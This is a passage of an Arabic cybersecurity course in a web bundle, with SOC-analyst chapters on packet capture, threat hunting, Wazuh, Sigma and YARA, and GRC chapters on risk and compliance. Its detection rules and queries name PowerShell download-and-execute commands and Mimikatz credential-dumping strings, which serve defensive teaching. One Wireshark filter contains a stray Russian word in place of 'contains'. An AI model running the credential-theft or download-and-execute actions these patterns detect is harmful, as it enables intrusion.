        <p>في بعض الحالات، لا تكفي السجلات. تحتاج إلى تحليل حركة المرور الخام لاستخراج الأدلة.</p>
        <div class="code-block">
# التقاط الحزم باستخدام tcpdump وحفظها في ملف
sudo tcpdump -i eth0 -s 1500 -w capture.pcap

# تحليل ملف pcap باستخدام tcpdump (سطر أوامر)
tcpdump -r capture.pcap -n 'host 192.168.1.100'

# في Wireshark، استخدم عوامل التصفية التالية:
# http.request uri содержит "admin" - طلبات تحتوي على كلمة admin
# dns.qry.name contains "malware" - استعلامات DNS مشبوهة
# tcp.port == 4444 - اتصالات على منفذ غير معتاد
        </div>
        <div class="note-box">
          📌 <strong>نشاط 12:</strong> قم بتشغيل فحص Nmap على شبكتك (معزولة). التقط الحزم أثناء الفحص. افتح الملف في Wireshark وحاول التعرف على حزم SYN، SYN-ACK، RST.
        </div>
      `},{number:13,title:"[متوسط] استخدام قواعد MITRE ATT&CK في التحليل",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث عشر: ربط التنبيهات بتكتيكات الهجوم</h2>
        <p>MITRE ATT&CK هو إطار يصف سلوكيات المهاجمين (تكتيكات، تقنيات، إجراءات). ربط التنبيهات بـ TTPs يساعد في فهم نية المهاجم.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">أمثلة على الربط:</h3>
        <ul>
          <li>تنبيه عن تشغيل PowerShell لتنزيل ملف -> يتوافق مع تقنية T1059.001 (Command and Scripting Interpreter).</li>
          <li>تنبيه عن إنشاء مهمة مجدولة (schtasks) -> تقنية T1053.005 (Scheduled Task).</li>
          <li>تنبيه عن مسح سجل الأمان (Event ID 1102) -> تقنية T1070.001 (Indicator Removal on Host).</li>
        </ul>
        <div class="fig-box">
          <i class="fas fa-chart-network text-neon text-2xl mb-2 block"></i>
          الشكل 13.1: مصفوفة MITRE ATT&CK Enterprise (جزء من الـ Tactics)
        </div>
      `},{number:14,title:"[متوسط] الاستجابة للحوادث (IR) للمحلل من المستوى الثاني",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع عشر: الانتقال من التحليل إلى الفعل</h2>
        <p>عند تأكيد الاختراق، يتم تفعيل خطة الاستجابة للحوادث (IRP). دور المحلل هنا يشمل:</p>
        <ul>
          <li>توثيق الحادثة (الطابع الزمني، الأدلة التي تم جمعها).</li>
          <li>احتواء أولي (مثل إيقاف حساب مستخدم مخترق، عزل جهاز عن الشبكة).</li>
          <li>جمع الأدلة الرقمية (نسخ الذاكرة، ملفات السجلات).</li>
          <li>التنسيق مع فريق الاستجابة للحوادث المتقدم.</li>
        </ul>
        <div class="code-block">
# أوامر لجمع الأدلة من ويندوز (قبل عزل الجهاز)
netstat -anob > netstat.txt
tasklist /v > processes.txt
wmic process get name,parentprocessid,processid > processes_wmic.txt

# عمل نسخة من سجل الأمان
wevtutil epl Security security_backup.evtx
        </div>
      `},{number:15,title:"[متوسط] الصيد الرقمي الأساسي (Threat Hunting)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس عشر: البحث الاستباقي عن التهديدات</h2>
        <p>بدلاً من انتظار التنبيهات، يقوم الصياد الرقمي بالبحث عن أنشطة قد تشير إلى اختراق غير مكتشف.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">منهجية مبسطة:</h3>
        <ol>
          <li>اختر فرضية تستند إلى TTP شائع (مثل استخدام PowerShell لإنشاء اتصال شبكي خارجي).</li>
          <li>اكتب استعلاماً في Kibana (أداة البحث في Wazuh) للبحث عن هذا النمط.</li>
          <li>افحص النتائج يدوياً وتأكد من عدم وجود أنشطة ضارة.</li>
          <li>وثق النتائج وشاركها مع الفريق.</li>
        </ol>
        <div class="code-block">
# مثال استعلام في Kibana للبحث عن استخدام PowerShell لتنزيل ملف من الإنترنت
winlogbeat* AND process.name:powershell.exe AND process.command_line:(*WebClient* OR *DownloadString* OR *Invoke-Expression*)
        </div>
      `},{number:16,title:"[متوسط] مراقبة النقاط الطرفية – Sysmon و Osquery",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس عشر: تفاصيل أكثر من سجلات ويندوز</h2>
        <p>Sysmon (System Monitor) يضيف أحداثاً غنية عن إنشاء العمليات، اتصالات الشبكة، تحميل الملفات، وتغييرات التسجيل.</p>
        <div class="code-block">
# تثبيت Sysmon مع تكوين من SwiftOnSecurity
sysmon64.exe -accepteula -i sysmonconfig.xml

# عرض أحداث Sysmon في Event Viewer (Applications and Services Logs/Microsoft/Windows/Sysmon/Operational)
        </div>
        <p>Osquery هي أداة لجمع معلومات النظام عبر لغة SQL.</p>
        <div class="code-block">
# استعلامات Osquery مفيدة:
SELECT pid, name, path FROM processes;
SELECT * FROM file WHERE path LIKE 'C:\\Windows\\Temp\\%' AND filename LIKE '%.exe';
SELECT * FROM listening_ports;
        </div>
      `},{number:17,title:"[متوسط] إدارة الثغرات ضمن SOC",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع عشر: كيف تتعامل SOC مع الثغرات المكتشفة؟</h2>
        <p>غالباً ما يكون فريق SOC مسؤولاً عن تتبع الثغرات الأمنية في أنظمة المؤسسة بالتنسيق مع فريق إدارة الثغرات.</p>
        <ul>
          <li>استقبال نتائج الفحص من OpenVAS أو Nessus.</li>
          <li>تحديد أولوية المعالجة بناءً على CVSS (خطورة الثغرة) وأهمية الأصل المتأثر.</li>
          <li>إخطار الفرق المعنية (مسؤولي الخوادم، المطورين).</li>
          <li>متابعة إغلاق الثغرات وإعادة الفحص.</li>
        </ul>
        <div class="note-box">
          📌 <strong>نشاط 17:</strong> قم بتشغيل فحص OpenVAS على أحد أجهزة المختبر. اختر ثلاث ثغرات بدرجات خطورة مختلفة. اكتب تقريراً قصيراً يوضح كيف ستتعامل مع كل منها.
        </div>
      `},{number:18,title:"[متوسط] مراجعة المستوى الثاني واختبار",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثامن عشر: اختبار الفهم للمستوى المتوسط</h2>
        <p>أجب عن الأسئلة التالية:</p>
        <ol>
          <li>ما الفرق بين True Positive و False Positive؟ أعط مثالاً لكل منهما.</li>
          <li>كيف يمكن استخدام VirusTotal API في عملية الإثراء؟</li>
          <li>ما هي المعلومات التي يمكنك استخراجها من ملف pcap؟</li>
          <li>ما هو إطار MITRE ATT&CK وما فائدته للمحلل؟</li>
          <li>اذكر ثلاث أدوات لجمع الأدلة الرقمية أثناء الاستجابة للحوادث.</li>
          <li>اكتب استعلاماً بسيطاً في Kibana للبحث عن عمليات powershell.exe مع سطر أوامر يحتوي على "DownloadFile".</li>
        </ol>
        <p><strong>المشروع العملي للمستوى الثاني:</strong> في مختبر Wazuh الخاص بك، قم بمحاكاة هجوم بسيط (مثل تشغيل سكريبت PowerShell لتنزيل ملف من الإنترنت). تأكد من ظهور التنبيه في Wazuh. قم بتطبيق خطوات الفرز (Triage) والإثراء باستخدام VirusTotal API، واكتب ملخصاً من صفحة واحدة عن الحادثة (النوع، المصدر، التوصيات).</p>
      `},{number:19,title:"[متقدم] أتمتة مهام SOC باستخدام Python و APIs",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل التاسع عشر: برمجة أدوات التحليل الخاصة بك</h2>
        <div class="code-block">
# سكريبت لسحب التنبيهات من Wazuh API
import requests
import json

# https://documentation.wazuh.com/current/user-manual/api/reference.html
api_url = "https://localhost:55000/security/user/authenticate?raw=true"
headers = {"Authorization": "Bearer YOUR_TOKEN"}
response = requests.get("https://localhost:55000/alerts", headers=headers, verify=False)
alerts = response.json()
for alert in alerts['data']['items']:
    print(alert['rule']['description'])

# سكريبت لإثراء تلقائي باستخدام VirusTotal
def enrich_ip(ip):
    # ... (مثل الكود السابق)
    return stats
        </div>
      `},{number:20,title:"[متقدم] بناء قواعد مخصصة في Wazuh للكشف عن سلوكيات محددة",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل العشرون: تخصيص نظام SIEM لبيئتك</h2>
        <p>قواعد Wazuh مكتوبة بلغة XML. يمكنك إضافتها إلى ملف <code>/var/ossec/etc/rules/local_rules.xml</code>.</p>
        <div class="code-block">
<!-- مثال: قاعدة للكشف عن تشغيل PowerShell مع سطر أوامر يحتوي على "DownloadFile" -->
<group name="local,powershell">
  <rule id="100001" level="10">
    <if_sid>530</if_sid>
    <match>powershell.exe</match>
    <regex>.*DownloadFile.*</regex>
    <description>PowerShell downloading file from internet</description>
  </rule>
</group>
        </div>
        <p>بعد إضافة القاعدة، أعد تشغيل Wazuh Manager: <code>sudo systemctl restart wazuh-manager</code>.</p>
        <div class="note-box">
          📌 <strong>نشاط 20:</strong> قم بإنشاء قاعدة مخصصة في Wazuh للتنبيه عند استخدام أمر <code>schtasks</code> (إنشاء مهمة مجدولة). اختبر القاعدة بتنفيذ الأمر على أحد الوكلاء.
        </div>
      `},{number:21,title:"[متقدم] تحليل سجلات متقدمة – العثور على أنماط الهجوم المعقدة",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الحادي والعشرون: البحث عن إبرة في كومة قش</h2>
        <p>استخدام تقنيات مثل ربط الأحداث (Event Correlation) وتحليل السلاسل الزمنية (Time Series).</p>
        <div class="code-block">
# مثال: استعلام في Kibana للبحث عن عدة أحداث مرتبطة
# حدث فشل تسجيل دخول متعدد (Event ID 4625) يتبعه حدث نجاح (4624) من نفس IP خلال 5 دقائق
winlogbeat* AND (event_id:4625 OR event_id:4624) | sort by @timestamp | bucket by src_ip
        </div>
      `},{number:22,title:"[متقدم] أتمتة الاستجابة (SOAR) – TheHive و Cortex",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني والعشرون: الاستجابة التلقائية للحوادث</h2>
        <p>TheHive هي منصة مفتوحة المصدر لإدارة الحوادث الأمنية. Cortex هي أداة تحليل تابعة لها.</p>
        <div class="code-block">
# تثبيت TheHive عبر Docker
curl -sSL https://raw.githubusercontent.com/StrangeBeeCorp/docker/main/install-thehive.sh | bash
# بعد التثبيت، افتح http://localhost:9000

# إنشاء منظمة وربط Cortex لتحليل العناوين والملفات تلقائياً.
        </div>
      `},{number:23,title:"[متقدم] الصيد الرقمي المتقدم (Hunting باستخدام Sigma و YARA)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث والعشرون: أدوات الصيد الاحترافية</h2>
        <p><strong>Sigma:</strong> لغة لكتابة قواعد الكشف (مشتركة بين SIEM المختلفة).</p>
        <p><strong>YARA:</strong> لغة للتعرف على الملفات الخبيثة بناءً على أنماط (سلاسل، بايتات، تعابير منتظمة).</p>
        <div class="code-block">
# مثال على قاعدة Sigma (للكشف عن تشغيل Mimikatz)
title: Possible Mimikatz Execution
status: experimental
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4663
        ObjectType: "Process"
        AccessMask: "0x1010"
    condition: selection
        </div>
        <div class="code-block">
# مثال على قاعدة YARA للتعرف على ملفات Mimikatz
rule Mimikatz {
    meta:
        description = "Detects Mimikatz strings"
    strings:
        $a = "mimikatz"
        $b = "sekurlsa::logonpasswords"
        $c = "privilege::debug"
    condition:
        any of them
}
        </div>
      `},{number:24,title:"[متقدم] تحليل الحوادث الكبرى وكتابة التقارير التنفيذية",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع والعشرون: التقارير التي تصنع الفارق</h2>
        <p>بعد انتهاء الحادثة، يقدم المحلل المتقدم تقريراً شاملاً للمديرين وللمختصين.</p>
        <ul>
          <li><strong>التقرير التنفيذي (لمدراء):</strong> ملخص باللغة العربية/الإنجليزية البسيطة، يوضح نطاق الضرر، الإجراءات المتخذة، والتوصيات العامة.</li>
          <li><strong>التقرير الفني (للفريق):</strong> التسلسل الزمني الكامل، الأدوات المستخدمة، مؤشرات الاختراق (IOCs)، التحليل الجنائي، والخطوات التصحيحية.</li>
        </ul>
        <div class="fig-box">
          <i class="fas fa-file-alt text-neon text-2xl mb-2 block"></i>
          الشكل 24.1: نموذج لهيكل تقرير الحادثة الأمنية
        </div>
      `},{number:25,title:"[متقدم] التعامل مع برامج الفدية (Ransomware) في بيئة SOC",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس والعشرون: سيناريو ساخن – هجوم Ransomware</h2>
        <p>تعتبر هجمات الفدية من أكثر الحوادث تدميراً. إجراءات SOC:</p>
        <ul>
          <li>اكتشاف: مراقبة مؤشرات التشفير الجماعي (تغيير ملحق الملفات، عمليات تشفير عالية في الـ CPU).</li>
          <li>احتواء: فصل الشبكة فوراً (عزل السويتش أو تعطيل بطاقة الشبكة).</li>
          <li>الاستئصال: تحديد نقطة الدخول (عادةً عبر RDP مكشوف أو تصيد).</li>
          <li>الاسترداد: استعادة الملفات من النسخ الاحتياطية (إذا كانت سليمة).</li>
        </ul>
      `},{number:26,title:"[متقدم] خطة التعلم لمدة 12 شهراً لتصبح SOC Analyst",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس والعشرون: من الصفر إلى محلل SOC محترف</h2>
        <ul>
          <li><strong>الشهر 1-2:</strong> CompTIA Security+ (أساسيات الأمن).</li>
          <li><strong>الشهر 3-4:</strong> التدريب على Blue Team Labs Online و Let's Defend (تمارين SOC مجانية).</li>
          <li><strong>الشهر 5-6:</strong> الحصول على شهادة BTL1 (Blue Team Level 1) – عملية جداً.</li>
          <li><strong>الشهر 7-9:</strong> دراسة CySA+ (CompTIA) أو CSA (EC-Council).</li>
          <li><strong>الشهر 10-12:</strong> بناء مختبر SOC متقدم (Wazuh + TheHive + Sigma) والبحث عن فرص عمل كـ "Tier 1 SOC Analyst".</li>
        </ul>
      `},{number:27,title:"[متقدم] المشروع النهائي الشامل",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع والعشرون: اختراق ومقاومة – سيناريو متكامل</h2>
        <p><strong>السيناريو:</strong> استلمت شركة افتراضية تقريراً بوجود نشاط مشبوه. تم تزويدك بـ:</p>
        <ul>
          <li>سجلات Windows Event Logs (أمان، نظام، PowerShell).</li>
          <li>ملف PCAP لحركة المرور خلال فترة الحادثة.</li>
          <li>نسخة من سجل الأمان الـ Registry (NTUSER.dat).</li>
        </ul>
        <p><strong>المطلوب:</strong></p>
        <ol>
          <li>تحليل السجلات (يدوياً وباستخدام أدوات SIEM) لتحديد النشاط الضار.</li>
          <li>إثبات أن الحادثة حدثت وتحديد الجذر (Root Cause).</li>
          <li>تقديم تقرير تحليل كامل (خطوات الهجوم، مؤشرات الاختراق).</li>
          <li>اقتراح إجراءات لمنع تكرار الحادثة.</li>
        </ol>
        <p>ستجد بيانات الحادثة (سجلات، pcap، ملفات ريجستري) في مجلد <code>data/incident</code> (يمكن تنزيلها من منصة التدريب المرتبطة). هذا المشروع يختبر جميع مهاراتك التي تعلمتها في الكورس.</p>
      `}]},sv={id:"grc",title:"GRC",emoji:"⚖️",color:"purple",description:"منهج متكامل من 3 مستويات - الحوكمة وإدارة المخاطر والامتثال",level:"مبتدئ / متوسط / متقدم",chaptersCount:27,pages:"~200 صفحة",icon:"fa-gavel",chapters:[{number:1,title:"[مبتدئ] ما هو GRC؟ المفاهيم الأساسية",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الأول: Governance, Risk Management, Compliance</h2>
        <p><strong>GRC</strong> هي اختصار لـ Governance (الحوكمة)، Risk Management (إدارة المخاطر)، و Compliance (الامتثال). هو نهج متكامل لإدارة المؤسسة يضمن تحقيق الأهداف مع الالتزام بالقوانين وتقليل المخاطر.</p>
        <ul>
          <li><strong>الحوكمة (Governance):</strong> كيف تُتخذ القرارات، توزيع المسؤوليات، وضمان الشفافية.</li>
          <li><strong>إدارة المخاطر (Risk Management):</strong> تحديد وتحليل وتقييم المخاطر، ثم اتخاذ إجراءات لتقليلها أو نقلها أو قبولها.</li>
          <li><strong>الامتثال (Compliance):</strong> الالتزام بالقوانين واللوائح والمعايير ذات الصلة بنشاط المؤسسة.</li>
        </ul>
        <div class="fig-box">
          <i class="fas fa-chart-pie text-neon text-2xl mb-2 block"></i>
          <strong>الشكل 1.1:</strong> أركان GRC – الحوكمة، المخاطر، الامتثال
        </div>
        <div class="note-box">
          📌 <strong>أهمية GRC:</strong> تجنب الغرامات المالية، تحسين اتخاذ القرار، حماية البيانات، زيادة ثقة المستثمرين والعملاء.
        </div>
      `},{number:2,title:"[مبتدئ] هيكل الحوكمة وأدوارها في المؤسسة",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني: من يدير الأمن السيبراني؟</h2>
        <p>الحوكمة تحدد من الذي يتخذ القرارات ومن المسؤول عن التنفيذ.</p>
        <ul>
          <li><strong>مجلس الإدارة:</strong> يوافق على استراتيجية الأمن والميزانية.</li>
          <li><strong>الرئيس التنفيذي (CEO):</strong> المسؤول النهائي عن الأمن.</li>
          <li><strong>كبير مسؤولي الأمن (CISO):</strong> يضع السياسات ويشرف على تنفيذها.</li>
          <li><strong>مسؤولو الامتثال (Compliance Officers):</strong> يتأكدون من الالتزام بالقوانين.</li>
          <li><strong>مديرو المخاطر (Risk Managers):</strong> يديرون عملية تقييم المخاطر.</li>
        </ul>
        <div class="fig-box">
          <i class="fas fa-sitemap text-neon text-2xl mb-2 block"></i>
          الشكل 2.1: هيكل حوكمة أمن المعلومات النموذجي
        </div>
        <div class="note-box">
          📌 <strong>نشاط 1:</strong> تخيل أنك CISO في مؤسسة متوسطة الحجم. اكتب هيكلاً تنظيمياً (3-4 مناصب رئيسية) ومسؤوليات كل منهم.
        </div>
      `},{number:3,title:"[مبتدئ] مقدمة في إدارة المخاطر – تصنيف المخاطر",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث: ما الذي قد يهدد مؤسستك؟</h2>
        <p>المخاطر تنقسم إلى عدة فئات:</p>
        <ul>
          <li><strong>مخاطر استراتيجية:</strong> تتعلق باتجاهات السوق، المنافسة، سمعة الشركة.</li>
          <li><strong>مخاطر تشغيلية:</strong> فشل العمليات الداخلية، أخطاء بشرية، أعطال تقنية.</li>
          <li><strong>مخاطر مالية:</strong> تقلبات العملة، الائتمان، السيولة.</li>
          <li><strong>مخاطر امتثال:</strong> الغرامات والدعاوى القضائية بسبب عدم الالتزام بالقوانين.</li>
          <li><strong>مخاطر الأمن السيبراني:</strong> اختراق البيانات، هجمات DDoS، برامج الفدية.</li>
        </ul>
      `},{number:4,title:"[مبتدئ] أساسيات الامتثال – أطر ومعايير شائعة",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع: الالتزام بالقواعد والمعايير</h2>
        <p>أهم الأطر والمعايير التي يجب معرفتها:</p>
        <ul>
          <li><strong>ISO 27001:</strong> المعيار الدولي لنظام إدارة أمن المعلومات (ISMS).</li>
          <li><strong>NIST SP 800-53:</strong> إطار ضوابط أمنية للحكومة الأمريكية.</li>
          <li><strong>COBIT:</strong> إطار حوكمة وتدقيق لتقنية المعلومات.</li>
          <li><strong>PCI DSS:</strong> معيار أمن بيانات بطاقات الدفع.</li>
          <li><strong>GDPR:</strong> لائحة حماية البيانات الأوروبية.</li>
          <li><strong>قانون حماية البيانات المصري رقم 151 لسنة 2020.</strong></li>
        </ul>
      `},{number:5,title:"[مبتدئ] إطار NIST CSF (Cybersecurity Framework)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس: خريطة طريق لتحسين الأمن السيبراني</h2>
        <p>يتكون NIST CSF من 5 وظائف أساسية:</p>
        <ol>
          <li><strong>تحديد (Identify):</strong> فهم الأصول، المخاطر، وسياسات الأمن.</li>
          <li><strong>حماية (Protect):</strong> تطبيق الضوابط لمنع الهجمات (جدران نارية، تشفير).</li>
          <li><strong>كشف (Detect):</strong> مراقبة الأنشطة واكتشاف الاختراقات.</li>
          <li><strong>استجابة (Respond):</strong> التعامل مع الحوادث الأمنية.</li>
          <li><strong>استرداد (Recover):</strong> استعادة الأنظمة والبيانات بعد الاختراق.</li>
        </ol>
        <div class="fig-box">
          <i class="fas fa-chart-network text-neon text-2xl mb-2 block"></i>
          الشكل 5.1: الوظائف الخمس لإطار NIST CSF
        </div>
      `},{number:6,title:"[مبتدئ] إجراء تقييم مخاطر بسيط – 5 خطوات",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس: كيف تبدأ في تقييم المخاطر</h2>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">الخطوات العملية:</h3>
        <ol>
          <li><strong>تحديد الأصول (Assets):</strong> الخوادم، قواعد البيانات، أجهزة الموظفين، البرمجيات.</li>
          <li><strong>تحديد التهديدات (Threats):</strong> هجمات إلكترونية، أخطاء بشرية، كوارث طبيعية.</li>
          <li><strong>تقدير الاحتمالية والتأثير:</strong> مقياس من 1 إلى 5 (1=منخفض جداً، 5=مرتفع جداً).</li>
          <li><strong>حساب مستوى المخاطرة (Risk Score):</strong> الاحتمالية × التأثير.</li>
          <li><strong>تحديد خيارات المعالجة:</strong> تقليل، نقل (تأمين)، قبول، تجنب.</li>
        </ol>
        <div class="code-block">
# مثال على سجل المخاطر (Risk Register) بتنسيق جدول
| Asset      | Threat          | Likelihood | Impact | Risk Score | Treatment   | Owner |
|------------|-----------------|------------|--------|------------|-------------|-------|
| CRM DB     | SQL Injection   | 4          | 5      | 20         | Implement   | DBA   |
| Public Wi-Fi| MitM Attack    | 3          | 4      | 12         | Use VPN      | Admin |
        </div>
      `},{number:7,title:"[مبتدئ] كتابة سياسة أمن معلومات أولية",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع: توثيق المبادئ الأساسية</h2>
        <p>السياسة (Policy) هي وثيقة عالية المستوى تحدد أهداف الأمن ومبادئه. مثال على بداية سياسة:</p>
        <div class="code-block">
# سياسة أمن المعلومات
**الهدف:** حماية سرية وتكامل وتوفر معلومات المؤسسة.
**النطاق:** جميع الموظفين والمقاولين والأطراف الثالثة.
**المبادئ:**
- يجب على كل مستخدم استخدام كلمة مرور قوية وتغييرها كل 90 يوماً.
- يمنع مشاركة كلمات المرور أو كتابتها على أوراق لاصقة.
- يجب الإبلاغ عن أي حادثة أمنية خلال 24 ساعة إلى فريق الاستجابة.
        </div>
        <div class="note-box">
          📌 <strong>نشاط 7:</strong> اكتب سياسة أمنية من صفحة واحدة لمؤسسة صغيرة (5-10 موظفين). تشمل: أهداف الأمن، نطاق التطبيق، الأدوار والمسؤوليات، إجراءات الإبلاغ عن الحوادث.
        </div>
      `},{number:8,title:"[مبتدئ] مقدمة في الامتثال التنظيمي (GDPR)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثامن: حماية البيانات الشخصية</h2>
        <p>لائحة GDPR الأوروبية تفرض التزامات صارمة على المؤسسات التي تجمع أو تعالج بيانات مواطني الاتحاد الأوروبي.</p>
        <ul>
          <li><strong>الموافقة الصريحة:</strong> يجب الحصول على موافقة واضحة من المستخدم لجمع بياناته.</li>
          <li><strong>الحق في النسيان (Right to be forgotten):</strong> يحق للمستخدم طلب حذف بياناته.</li>
          <li><strong>إخطار الاختراقات:</strong> يجب إخطار السلطات خلال 72 ساعة من اكتشاف اختراق البيانات.</li>
          <li><strong>تعيين مسؤول حماية البيانات (DPO).</strong></li>
          <li><strong>غرامات ضخمة:</strong> تصل إلى 20 مليون يورو أو 4% من الإيرادات العالمية.</li>
        </ul>
      `},{number:9,title:"[مبتدئ] مراجعة المستوى الأول واختبار",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل التاسع: اختبار الفهم للمستوى المبتدئ</h2>
        <p>أجب عن الأسئلة التالية:</p>
        <ol>
          <li>ما هي مكونات GRC الثلاثة؟ اشرح كل واحد بإيجاز.</li>
          <li>اذكر ثلاث وظائف رئيسية في هيكل حوكمة أمن المعلومات.</li>
          <li>ما هو الفرق بين المخاطر التشغيلية ومخاطر الامتثال؟</li>
          <li>أي معيار دولي يركز على نظام إدارة أمن المعلومات؟</li>
          <li>ما هي مراحل تقييم المخاطر الخمس الأساسية؟</li>
          <li>ما المقصود بـ GDPR؟</li>
        </ol>
        <p><strong>المشروع العملي للمستوى الأول:</strong> اختر مؤسسة افتراضية صغيرة (مثل عيادة طبية، متجر إلكتروني). قم بتحديد 5 أصول على الأقل، وصنف المخاطر المحتملة لكل أصل (احتمالية وتأثير). أنشئ سجل مخاطر بسيط. أضف عموداً لخطة المعالجة الأولية. سلم التقرير.</p>
      `},{number:10,title:"[متوسط] متطلبات ISO 27001:2022 بالتفصيل",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل العاشر: المعيار الذهبي لإدارة أمن المعلومات</h2>
        <p>ISO 27001 يتكون من 4 مجموعات رئيسية في الملحق Annex A (93 ضابطاً في الإصدار الجديد):</p>
        <ul>
          <li><strong>5. السياسات التنظيمية (Organizational Controls):</strong> 37 ضابطاً – تشمل سياسات الأمن، إدارة الهوية، الأمن السحابي.</li>
          <li><strong>6. الضوابط البشرية (People Controls):</strong> 8 ضوابط – الفحص قبل التوظيف، التوعية، إنهاء الخدمة.</li>
          <li><strong>7. الضوابط المادية (Physical Controls):</strong> 14 ضابطاً – الأمن المادي، التحكم في الدخول، حماية المعدات.</li>
          <li><strong>8. الضوابط التقنية (Technological Controls):</strong> 34 ضابطاً – إدارة الثغرات، تشفير البيانات، أمن الشبكات.</li>
        </ul>
        <p>للحصول على الشهادة، يجب تطبيق جميع الضوابط ذات الصلة بعملك.</p>
      `},{number:11,title:"[متوسط] إطار NIST SP 800-53 (ضوابط أمنية)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الحادي عشر: ضوابط أمنية للحكومة والمؤسسات الكبرى</h2>
        <p>NIST SP 800-53 يحتوي على أكثر من 1000 ضابط أمني مقسمة إلى 20 عائلة (مثل: التحكم في الوصول، التدقيق، التقييم، إلخ).</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">أمثلة على عائلات الضوابط:</h3>
        <ul>
          <li><strong>AC (Access Control):</strong> التحكم في الوصول إلى الأنظمة والبيانات.</li>
          <li><strong>AU (Audit and Accountability):</strong> تسجيل الأحداث ومراجعتها.</li>
          <li><strong>RA (Risk Assessment):</strong> تقييم المخاطر الدوري.</li>
          <li><strong>SI (System and Information Integrity):</strong> حماية النظام من البرامج الضارة.</li>
        </ul>
        <div class="note-box">
          📌 <strong>نشاط 11:</strong> ابحث عن إطار NIST SP 800-53. اختر ثلاث ضوابط من عائلة AC (Access Control) واشرح كيف يمكن تنفيذها في شركة.
        </div>
      `},{number:12,title:"[متوسط] تقييم المخاطر الكمي والنوعي",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني عشر: أرقام أم أوصاف؟</h2>
        <ul>
          <li><strong>التقييم النوعي (Qualitative):</strong> يستخدم أوصافاً مثل "منخفض"، "متوسط"، "عالي". مناسب عند عدم توفر بيانات دقيقة. سريع وسهل.</li>
          <li><strong>التقييم الكمي (Quantitative):</strong> يستخدم أرقاماً محددة (تكلفة الخسارة، احتمالية الحدوث). دقيق لكن يتطلب بيانات تاريخية. مثال: حساب ALE (Annualized Loss Expectancy) = SLE (Single Loss Expectancy) × ARO (Annualized Rate of Occurrence).</li>
        </ul>
        <div class="code-block">
# مثال على تقييم كمي بسيط
SLE (خسارة حدث واحد) = 100,000 دولار
ARO (معدل الحدوث السنوي) = 0.2 (مرة كل 5 سنوات)
ALE (الخسارة السنوية المتوقعة) = 100,000 × 0.2 = 20,000 دولار

# إذا كانت تكلفة الحل (مثل شراء جدار ناري) أقل من 20,000 دولار، فإن الاستثمار مجدٍ اقتصادياً.
        </div>
      `},{number:13,title:"[متوسط] كتابة إجراءات ووثائق GRC (نموذج عملي)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث عشر: تحويل السياسات إلى إجراءات قابلة للتنفيذ</h2>
        <p>الإجراءات (Procedures) تشرح كيفية تنفيذ السياسات. مثال: إجراء تغيير كلمة المرور.</p>
        <div class="code-block">
# إجراء تغيير كلمة المرور (للموظفين)
1. اضغط على Ctrl+Alt+Del ثم اختر "تغيير كلمة المرور".
2. أدخل كلمة المرور الحالية ثم الجديدة (يجب أن تتوافق مع سياسة كلمات المرور).
3. أكد كلمة المرور الجديدة.
4. سجل الخروج والدخول بكلمة المرور الجديدة.
# مسؤول النظام يجب أن يراجع سجل الأمان للتأكد من نجاح التغيير.
        </div>
        <div class="note-box">
          📌 <strong>نشاط 13:</strong> اختر سياسة لديك (مثلاً سياسة الوصول عن بعد) واكتب إجراءً مفصلاً (5-10 خطوات) لتنفيذها.
        </div>
      `},{number:14,title:"[متوسط] إدارة المخاطر الخارجية – موردون وأطراف ثالثة",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع عشر: المخاطر التي تأتي من خارج جدرانك</h2>
        <p>اختراقات كثيرة تحدث عبر موردين أو شركاء. إجراءات إدارة مخاطر الموردين (Third-Party Risk Management):</p>
        <ul>
          <li>الفحص الأولي للمورد (استبيانات أمنية، شهادات مثل ISO 27001).</li>
          <li>تضمين بنود أمنية في العقود (NDA، إخطار بالاختراقات، حق التدقيق).</li>
          <li>المراجعة الدورية للموردين (سنوياً أو ربع سنوي).</li>
          <li>خطة للخروج الآمن (Offboarding) عند إنهاء التعاقد (سحب البيانات، إلغاء الصلاحيات).</li>
        </ul>
      `},{number:15,title:"[متوسط] استمرارية الأعمال (BCP) والتعافي من الكوارث (DRP)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس عشر: كيف تبقى الأعمال قيد التشغيل بعد الكارثة؟</h2>
        <p><strong>خطة استمرارية الأعمال (BCP):</strong> تضمن استمرار العمليات الحيوية أثناء الأزمات (حتى لو بوتيرة مخفضة).</p>
        <p><strong>خطة التعافي من الكوارث (DRP):</strong> تركز على استعادة البنية التحتية التقنية (الخوادم، البيانات، الشبكات).</p>
